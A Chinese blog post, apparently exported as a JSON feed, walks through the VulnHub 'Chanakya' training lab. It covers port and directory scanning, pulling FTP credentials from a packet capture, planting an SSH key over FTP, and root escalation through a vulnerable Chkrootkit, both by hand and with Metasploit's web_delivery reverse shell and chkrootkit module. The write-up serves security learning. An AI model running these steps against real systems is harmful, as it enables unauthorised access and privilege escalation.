{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"chanakya靶场笔记\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "https://chungod.github.io",
    "items": [
        {
            "id": "https://chungod.github.io/2021/08/20/Chanakya%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/",
            "url": "https://chungod.github.io/2021/08/20/Chanakya%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/",
            "title": "Chanakya靶场笔记",
            "date_published": "2021-08-20T08:31:00.000Z",
            "content_html": "<h2 id=\"chanakya靶场笔记\"><a class=\"markdownIt-Anchor\" href=\"#chanakya靶场笔记\">#</a> Chanakya 靶场笔记</h2>\n<p>靶场下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGEtY2hhbmFreWEsMzk1Lw==\">https://www.vulnhub.com/entry/ha-chanakya,395/</span></p>\n<h3 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>利用 nmap 进行扫描，发现开放了 21，22，80 端口</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820151737064.png\" alt=\"image-20210820151737064\"></p>\n<p>进一步扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -n -sV -sC -A 172.16.10.136</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820151927536.png\" alt=\"image-20210820151927536\"></p>\n<h3 id=\"目录枚举\"><a class=\"markdownIt-Anchor\" href=\"#目录枚举\">#</a> 目录枚举</h3>\n<p>利用 dirb 进行扫描目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dirb http://172.16.10.136 -X .php,.txt,.html,.xml,.yml,.json</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820152105295.png\" alt=\"image-20210820152105295\"></p>\n<p>发现存在 abuse.txt，将其下载下来查看，得到一串奇怪字符<strong> nfubxn.cpncat</strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820152153462.png\" alt=\"image-20210820152153462\"></p>\n<p>经过百度分析，发现这是一种 ROT13 的加密方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROT13（回转13位）是一种简易的替换式密码算法。它是一种在英文网络论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。ROT13 也是过去在古罗马开发的凯撒密码的一种变体。ROT13是它自身的逆反，即：要还原成原文只要使用同一算法即可得，故同样的操作可用于加密与解密。该算法并没有提供真正密码学上的保全，故它不应该被用于需要保全的用途上。它常常被当作弱加密示例的典型。</span><br><span class=\"line\">应用ROT13到一段文字上仅仅只需要检查字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。A换成N、B换成O、依此类推到M换成Z，然后串行反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里的字符受影响；数字、符号、空白字符以及所有其他字符都不变。替换后的字母大小写保持不变。</span><br><span class=\"line\">N-A O-B P-C Q-D R-E S-F T-G U-H V-I W-J X-K Y-L Z-M</span><br></pre></td></tr></table></figure>\n<p>将其 rot13 进行解密得到 ashoka.pcapng，猜想浏览器存在</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820152640154.png\" alt=\"image-20210820152640154\"></p>\n<p>尝试浏览器访问，并下载下来，成功得到 ashoka.pcapng 数据包</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820153050614.png\" alt=\"image-20210820153050614\"></p>\n<h3 id=\"分析数据包\"><a class=\"markdownIt-Anchor\" href=\"#分析数据包\">#</a> 分析数据包</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wireshark ashoka.pcapng </span><br><span class=\"line\">分析数据包，发现存在大量FTP协议包，成功得到ftp用户和密码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820153306877.png\" alt=\"image-20210820153306877\"></p>\n<p>靶机开放了 21 端口，利用 FTP 成功连接，但发现并没有什么有用信息</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820153745039.png\" alt=\"image-20210820153745039\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">参考网上，SSH免密登录</span><br><span class=\"line\">显示的内容像是在用户路径下的隐藏文件，该ftp的目录可能就是ashoka用户的目录。而且ftp运行新建文件夹和上传文件。</span><br><span class=\"line\">所以可以设置SSH免密登录，将文件上传到.ssh的文件夹下。</span><br></pre></td></tr></table></figure>\n<h3 id=\"ftp渗透利用ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#ftp渗透利用ssh免密登录\">#</a> FTP 渗透（利用 SSH 免密登录）</h3>\n<p>首先在 kali 生成公钥和私钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen 生成</span><br><span class=\"line\">cat id_rsa.pub &gt; authorized_keys  更改名字</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820154317504.png\" alt=\"image-20210820154317504\"></p>\n<p>利用 FTP 将公钥进行上传到靶机上，成功上传</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lcd /root/.ssh</span><br><span class=\"line\">mkdir .ssh</span><br><span class=\"line\">cd .ssh</span><br><span class=\"line\">put authorized_keys</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820155656817.png\" alt=\"image-20210820155656817\"></p>\n<p>下面直接利用 ssh 进行连接 ashoka（免密登录）</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820155720343.png\" alt=\"image-20210820155720343\"></p>\n<h3 id=\"提权chkrootkit\"><a class=\"markdownIt-Anchor\" href=\"#提权chkrootkit\">#</a> 提权（Chkrootkit）</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">思路：</span><br><span class=\"line\">我们得到了 ashoka 用户的权限。经过一些枚举，我们看到临时文件/tmp中有一个日志文件。我们尝试使用 cat 命令查看它。它绝对看起来像 Chkrootkit 测试结果日志,这是我们可以使用 Chkrootkit 在这台机器上提升权限的线索。</span><br></pre></td></tr></table></figure>\n<h4 id=\"提权一执行脚本\"><a class=\"markdownIt-Anchor\" href=\"#提权一执行脚本\">#</a> 提权一（执行脚本）</h4>\n<p>发现可以利用本地 Chkrootkit 进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820155932366.png\" alt=\"image-20210820155932366\"></p>\n<p>进一步查看 Chkrootkit 权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name chkrootkit* 2&gt;/dev/null</span><br><span class=\"line\">cd /usr/local/share/chkrootkit</span><br><span class=\"line\">./chkrootkit -V  </span><br><span class=\"line\">发现此版本确实存在提权漏洞，Chkrootkit0.49以及以下版本均存在本地提权漏洞，只要提权上传一个文件到tmp目录，管理员再次运行Chkrootkit后，即可获取root权限</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820160200147.png\" alt=\"image-20210820160200147\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820160305476.png\" alt=\"image-20210820160305476\"></p>\n<p>所以，在 kali 中新建一个 update.c 的文件，并写入下面的数据。</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820160703494.png\" alt=\"image-20210820160703494\"></p>\n<p>将其上传到靶机上进行编译和执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /tmp</span><br><span class=\"line\">gcc update.c -o update</span><br><span class=\"line\">./update</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820161039785.png\" alt=\"image-20210820161039785\"></p>\n<p>这里我刚拷 update 进去不一会就变成 root 了，等 待一会运行./update</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820161130008.png\" alt=\"image-20210820161130008\"></p>\n<h4 id=\"提权二模块提权\"><a class=\"markdownIt-Anchor\" href=\"#提权二模块提权\">#</a> 提权二（模块提权）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">思路：用到两个模块，反弹模块和提权Chkrootkit模块</span><br><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">use exploit/unix/local/chkrootkit</span><br></pre></td></tr></table></figure>\n<p>首先，利用反弹 shell 模块，为我们提供一个在目标机器上的 meterpreter。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search web_de</span><br><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">set lhost 本地IP</span><br><span class=\"line\">set lport 监听端口</span><br><span class=\"line\">set uripath 指定url</span><br><span class=\"line\">exploit 生成</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820161733723.png\" alt=\"image-20210820161733723\"></p>\n<p>将生成的命令，复制到靶机进行粘贴，成功反弹 ashoka 用户的权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820161946891.png\" alt=\"image-20210820161946891\"></p>\n<p>下面进行提权模块利用，成功利用 Chkrootkit 模块提权 root</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background</span><br><span class=\"line\">search chkrootkit</span><br><span class=\"line\">use exploit/unix/local/chkrootkit</span><br><span class=\"line\">set sessions 1</span><br><span class=\"line\">exploit </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210820162651032.png\" alt=\"image-20210820162651032\"></p>\n",
            "tags": [
                "Chanakya靶场笔记"
            ]
        }
    ]
}